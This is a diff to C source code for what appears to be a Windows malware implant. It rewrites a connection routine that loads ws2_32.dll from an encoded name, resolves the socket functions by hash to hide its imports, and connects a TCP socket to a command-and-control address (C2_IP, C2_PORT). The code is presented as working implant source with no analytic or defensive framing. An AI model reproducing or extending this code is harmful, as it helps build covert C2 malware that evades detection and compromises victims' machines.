@@ -9,6 +9,8 @@
 #include "../include/macros.h"
 #include "../include/syscalls.h"
 #include "../include/decoding.h"
+#include "../include/global.h"
+
 
 #include <winsock2.h>
 
@@ -17,40 +19,31 @@ unsigned long long  (__stdcall    *WSASocketFunc)       (int, int, int, LPWSAPRO
 int                 (__stdcall    *WSAConnectFunc)      (SOCKET,const struct sockaddr*,int, LPWSABUF,LPWSABUF,LPQOS,LPQOS);
 int                 (__stdcall    *SendFunc)            (SOCKET,const char FAR*,int, int);
 
-extern unsigned long long hSocket;
+unsigned long long  hSocket = {0};
 
 int InitConnection() {
-        void       *SocketDll   = {0};
-        WSADATA     WSAStruct   = {0};
-        SOCKADDR_IN SocketAddr  = {0};
-        /*the passed argument is just ws2_32.dll encoded*/
-        if (SocketDll == NULL) {
-            SocketDll       = LoadDll(WS232);
-            WSAStartupFunc  = NULL;
-            WSASocketFunc   = NULL;
-            WSAConnectFunc  = NULL;
-            SendFunc        = NULL;
-        }
+    void               *SocketDll   = {0};
+    WSADATA             WSAStruct   = {0};
+    SOCKADDR_IN         SocketAddr  = {0};
 
-        if (WSAStartupFunc == NULL) {
-            WSAStartupFunc      = GetFuncAddress(SocketDll, WSASTARTUP);
-            WSASocketFunc       = GetFuncAddress(SocketDll, WSASOCKETW);
-            WSAConnectFunc      = GetFuncAddress(SocketDll, WSACONNECT);
-            SendFunc            = GetFuncAddress(SocketDll, SEND);
-        }
+    /*the passed argument is just ws2_32.dll encoded*/
+    SocketDll           = LoadDll(WS232);
+    WSAStartupFunc      = GetFuncAddress(SocketDll, (HashInfo){WSASTARTUP, 10});
+    WSASocketFunc       = GetFuncAddress(SocketDll, (HashInfo){WSASOCKETW, 10});
+    WSAConnectFunc      = GetFuncAddress(SocketDll, (HashInfo){WSACONNECT, 10});
+    SendFunc            = GetFuncAddress(SocketDll, (HashInfo){SEND, 4});
 
-        if (hSocket == 0) {
-            WSAStartupFunc(MAKEWORD(2, 2), &WSAStruct) == 0;
-        }
-        hSocket = WSASocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    WSAStartupFunc(MAKEWORD(2, 2), &WSAStruct) == 0;
 
-        SocketAddr.sin_family       = AF_INET;
-        SocketAddr.sin_port         = C2_PORT;
-        SocketAddr.sin_addr.s_addr  = C2_IP;
+    hSocket = WSASocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
-        if (WSAConnectFunc(hSocket, (SOCKADDR*)&SocketAddr, sizeof(SocketAddr), NULL, NULL, NULL, NULL) != 0) {
-            return -1;
-        }
+    SocketAddr.sin_family       = AF_INET;
+    SocketAddr.sin_port         = C2_PORT;
+    SocketAddr.sin_addr.s_addr  = C2_IP;
+
+    if (WSAConnectFunc(hSocket, (SOCKADDR*)&SocketAddr, sizeof(SocketAddr), NULL, NULL, NULL, NULL) != 0) {
+        return -1;
+    }
 }
 
 
